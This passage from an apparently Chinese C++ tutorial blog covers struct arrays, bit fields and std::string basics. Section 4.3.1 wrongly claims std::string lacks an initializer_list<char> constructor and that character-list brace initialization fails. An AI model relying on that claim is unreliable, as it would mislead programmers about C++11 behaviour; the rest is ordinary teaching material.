Structures)**，即数组的每个元素都是一个结构变量。这对于处理一组具有相同结构的数据非常有用，例如一个班级的学生信息、一个商店的库存列表等。</p><p><strong>声明和初始化:</strong></p><p>声明结构数组与声明普通数组类似，只是元素类型是结构类型。初始化可以使用嵌套的花括号。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CLASS_SIZE = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个包含 CLASS_SIZE 个 Student 结构的数组</span></span><br><span class="line">    Student classRoster[CLASS_SIZE]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化结构数组 (使用嵌套花括号)</span></span><br><span class="line">    Student graduates[<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Alice&quot;</span>, <span class="number">101</span>&#125;, <span class="comment">// 初始化 graduates[0]</span></span><br><span class="line">        &#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">102</span>&#125;    <span class="comment">// 初始化 graduates[1]</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化</span></span><br><span class="line">    Student freshmen[CLASS_SIZE] &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">201</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;David&quot;</span>, <span class="number">202</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;Eve&quot;</span>, <span class="number">203</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问结构数组中的元素及其成员</span></span><br><span class="line">    classRoster[<span class="number">0</span>].name = <span class="string">&quot;Frank&quot;</span>;</span><br><span class="line">    classRoster[<span class="number">0</span>].studentID = <span class="number">301</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Graduate 1: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Freshman 3 ID: &quot;</span> &lt;&lt; freshmen[<span class="number">2</span>].studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Roster 1 Name: &quot;</span> &lt;&lt; classRoster[<span class="number">0</span>].name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历结构数组</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nFreshmen List:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLASS_SIZE; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; freshmen[i].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; freshmen[i].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Student classRoster[CLASS_SIZE];</code>: 声明了一个数组，每个元素都是 <code>Student</code> 结构。</li><li>  <code>graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;</code>: 初始化数组的第一个元素（一个 <code>Student</code> 结构）。</li><li>  <code>freshmen[i].name</code>: 访问数组 <code>freshmen</code> 中索引为 <code>i</code> 的元素的 <code>name</code> 成员。</li></ul><h2 id="4-4-6-结构中的位字段"><a href="#4-4-6-结构中的位字段" class="headerlink" title="4.4.6 结构中的位字段"></a>4.4.6 结构中的位字段</h2><p><strong>位字段 (Bit Field)</strong> 是一种特殊的结构成员，它允许你指定成员变量占用的**位数 (bits)**。这主要用于需要精确控制内存布局或与硬件寄存器交互的场景。</p><p><strong>语法:</strong></p><p>在结构定义中，成员名后面跟一个冒号 <code>:</code> 和一个整数常量，表示该成员占用的位数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RegisterFlags</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readEnable : <span class="number">1</span>; <span class="comment">// 占用 1 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writeEnable : <span class="number">1</span>; <span class="comment">// 占用 1 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mode : <span class="number">2</span>;       <span class="comment">// 占用 2 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> reserved : <span class="number">4</span>;   <span class="comment">// 占用 4 位 (通常用于填充或对齐)</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>特点和注意事项:</strong></p><ul><li>  <strong>类型:</strong> 位字段的类型通常是 <code>unsigned int</code> 或 <code>signed int</code>（或 <code>int</code>，其符号性取决于实现），也可以是 <code>bool</code> (C++11，等效于 <code>: 1</code>)。</li><li>  <strong>内存节省:</strong> 当多个标志或小范围数值需要存储时，位字段可以显著节省内存，将它们打包到单个整数或几个字节中。</li><li>  <strong>硬件接口:</strong> 常用于映射硬件设备寄存器的特定位。</li><li>  <strong>访问:</strong> 像普通结构成员一样使用点运算符访问，但不能获取位字段的地址（<code>&amp;</code> 运算符不能用于位字段）。</li><li>  <strong>可移植性:</strong> 位字段的内存布局（位的排列顺序、跨字节边界的处理）可能因编译器和平台而异，因此在需要跨平台兼容性的代码中应谨慎使用。</li><li>  <strong>大小限制:</strong> 位数不能超过其基础类型的位数（例如，<code>unsigned int</code> 的位字段不能超过 <code>int</code> 的位数）。</li><li>  <strong>匿名位字段:</strong> 可以使用未命名的位字段来填充或对齐，例如 <code>unsigned int : 2;</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设用于控制某个设备的状态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceStatus</span> &#123;</span></span><br><span class="line">    <span class="comment">// 打包到单个字节 (假设 unsigned int 至少 8 位)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> powerOn : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> errorFlag : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> channel : <span class="number">3</span>; <span class="comment">// 可以表示 0-7</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> : <span class="number">3</span>;       <span class="comment">// 填充未使用的 3 位，使总共 8 位</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DeviceStatus status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置位字段的值</span></span><br><span class="line">    status.powerOn = <span class="number">1</span>;    <span class="comment">// 设备开机</span></span><br><span class="line">    status.errorFlag = <span class="number">0</span>; <span class="comment">// 无错误</span></span><br><span class="line">    status.channel = <span class="number">5</span>;   <span class="comment">// 设置通道为 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取位字段的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device Status:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Power On: &quot;</span> &lt;&lt; status.powerOn &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Error Flag: &quot;</span> &lt;&lt; status.errorFlag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Channel: &quot;</span> &lt;&lt; status.channel &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 位字段通常打包存储</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DeviceStatus struct: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DeviceStatus) &lt;&lt; <span class="string">&quot; byte(s)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出通常是 1 或 4 (取决于编译器如何对齐和打包，以及 int 的大小)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查特定标志</span></span><br><span class="line">    <span class="keyword">if</span> (status.powerOn) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device is powered on.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能获取位字段地址</span></span><br><span class="line">    <span class="comment">// unsigned int* pPower = &amp;status.powerOn; // 错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>位字段是一种底层工具，适用于特定场景，但在常规应用程序开发中不常用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.3 string类简介</title>
      <link href="2025/04/26/4.3_string%E7%B1%BB%E7%AE%80%E4%BB%8B/"/>
      <url>2025/04/26/4.3_string%E7%B1%BB%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>虽然 C 风格字符串（字符数组）在 C++ 中仍然可用，但 C++ 标准库提供了一个更强大、更方便、更安全的替代品：<code>std::string</code> 类。</p><p><code>string</code> 类是标准库的一部分，它封装了字符序列的操作，提供了自动内存管理和丰富的成员函数来处理字符串。要使用 <code>string</code> 类，需要包含 <code>&lt;string&gt;</code> 头文件。</p><p><strong>基本概念:</strong></p><ul><li>  <strong>对象:</strong> <code>string</code> 类型的变量是**对象 (Object)**。对象是类的实例。</li><li>  <strong>自动内存管理:</strong> 与需要手动管理内存（确保数组足够大，处理空字符）的 C 风格字符串不同，<code>string</code> 对象会自动处理内存分配和释放。它可以根据需要动态增长或缩小。</li><li>  <strong>成员函数:</strong> <code>string</code> 类提供了许多内置的操作（成员函数），如获取长度、拼接、查找、替换等，使得字符串处理更加容易。</li></ul><p><strong>基本用法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 必须包含 string 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明 string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1; <span class="comment">// 创建一个空字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 使用 C 风格字符串字面值初始化</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>; <span class="comment">// 使用 C 风格字符串字面值初始化 (构造函数语法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = s2; <span class="comment">// 使用另一个 string 对象初始化 (复制)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出空行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s2: &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 World</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// string 对象可以像普通变量一样使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = s2 + <span class="string">&quot;, &quot;</span> + s3 + <span class="string">&quot;!&quot;</span>; <span class="comment">// 字符串拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Message: &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello, World!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-1-C-11字符串初始化"><a href="#4-3-1-C-11字符串初始化" class="headerlink" title="4.3.1 C++11字符串初始化"></a>4.3.1 C++11字符串初始化</h2><p>C++11 引入的列表初始化（花括号初始化）也可以用于 <code>string</code> 对象，其行为类似于使用 C 风格字符串字面值进行初始化。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str1 &#123; <span class="string">&quot;Initialized with braces&quot;</span> &#125;; <span class="comment">// 使用 C 风格字符串字面值</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str2 = &#123; <span class="string">&quot;Also works with =&quot;</span> &#125;; </span><br><span class="line"><span class="comment">// std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 中通常不直接用字符列表初始化 string (会尝试调用匹配的构造函数)</span></span><br><span class="line"><span class="comment">// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // 同上</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 直接使用字符列表 <code>&#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125;</code> 来初始化 <code>std::string</code> 在 C++11/14 中通常不会按预期工作，因为它会尝试查找接受 <code>std::initializer_list&lt;char&gt;</code> 的构造函数，而标准 <code>std::string</code> 没有这样的构造函数。它通常会被解释为尝试调用接受 C 风格字符串 ( <code>const char*</code> ) 的构造函数，但这需要列表恰好能形成一个有效的 C 风格字符串（例如，包含 <code>\0</code>）。</p><p>最常用和清晰的初始化方式仍然是使用字符串字面值或另一个 <code>string</code> 对象。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting1 &#123; <span class="string">&quot;Good morning&quot;</span> &#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting2 = &#123; <span class="string">&quot;Good afternoon&quot;</span> &#125;;</span><br><span class="line">    <span class="comment">// std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\0&#x27; &#125;; // 可能不按预期工作或编译错误</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Good morning</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Good afternoon</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推荐的初始化方式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;       <span class="comment">// C 风格字面值</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>;      <span class="comment">// 构造函数语法</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = s1;          <span class="comment">// 复制构造</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;c&#x27;</span>)</span></span>;      <span class="comment">// 创建包含 10 个 &#x27;c&#x27; 的字符串 &quot;cccccccccc&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-2-赋值、拼接和附加"><a href="#4-3-2-赋值、拼接和附加" class="headerlink" title="4.3.2 赋值、拼接和附加"></a>4.3.2 赋值、拼接和附加</h2><p><code>string</code> 类重载了常见的运算符，使得赋值、拼接和附加操作非常直观。</p><ul><li>  <strong>赋值 (<code>=</code>):</strong> 可以将一个 <code>string</code> 对象、一个 C 风格字符串字面值或一个 <code>char</code> 赋给一个 <code>string</code> 对象。</li><li>  <strong>拼接 (<code>+</code>):</strong> 可以使用 <code>+</code> 运算符将两个 <code>string</code> 对象、<code>string</code> 对象和 C 风格字符串字面值、或者 <code>string</code> 对象和 <code>char</code> 拼接起来，生成一个新的 <code>string</code> 对象。<strong>注意：不能直接拼接两个 C 风格字符串字面值，至少有一个操作数需要是 <code>string</code> 对象。</strong></li><li>  <strong>附加 (<code>+=</code>):</strong> 可以使用 <code>+=</code> 运算符将一个 <code>string</code> 对象、一个 C 风格字符串字面值或一个 <code>char</code> 附加到现有 <code>string</code> 对象的末尾（修改原字符串）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    s3 = s1; <span class="comment">// s3 变为 &quot;Hello&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&quot;Goodbye&quot;</span>; <span class="comment">// s3 变为 &quot;Goodbye&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after new assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// s3 变为 &quot;X&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after char assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接 (+) - 创建新字符串</span></span><br><span class="line">    s4 = s1 + <span class="string">&quot; &quot;</span> + s2 + <span class="string">&quot;!&quot;</span>; <span class="comment">// s4 变为 &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4 (concatenated): &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s5 = s1 + <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s5 变为 &quot;Hello!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s5 (string + char): &quot;</span> &lt;&lt; s5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 不能直接拼接两个 C 风格字符串字面值</span></span><br><span class="line">    <span class="comment">// std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // 编译错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 至少有一个是 string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str1 = s1 + <span class="string">&quot; String2&quot;</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str2 = <span class="string">&quot;String1&quot;</span> + s2; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str1: &quot;</span> &lt;&lt; ok_str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str2: &quot;</span> &lt;&lt; ok_str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 附加 (+=) - 修改原字符串</span></span><br><span class="line">    s1 += <span class="string">&quot; &quot;</span>; <span class="comment">// s1 变为 &quot;Hello &quot;</span></span><br><span class="line">    s1 += s2; <span class="comment">// s1 变为 &quot;Hello World&quot;</span></span><br><span class="line">    s1 += <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s1 变为 &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 after append: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-3-string类的其他操作"><a href="#4-3-3-string类的其他操作" class="headerlink" title="4.3.3 string类的其他操作"></a>4.3.3 string类的其他操作</h2><p><code>string</code> 类提供了大量成员函数来执行各种字符串操作。以下是一些常用的操作：</p><ul><li><strong>获取长度/大小:</strong><ul><li>  <code>size()</code> 或 <code>length()</code>: 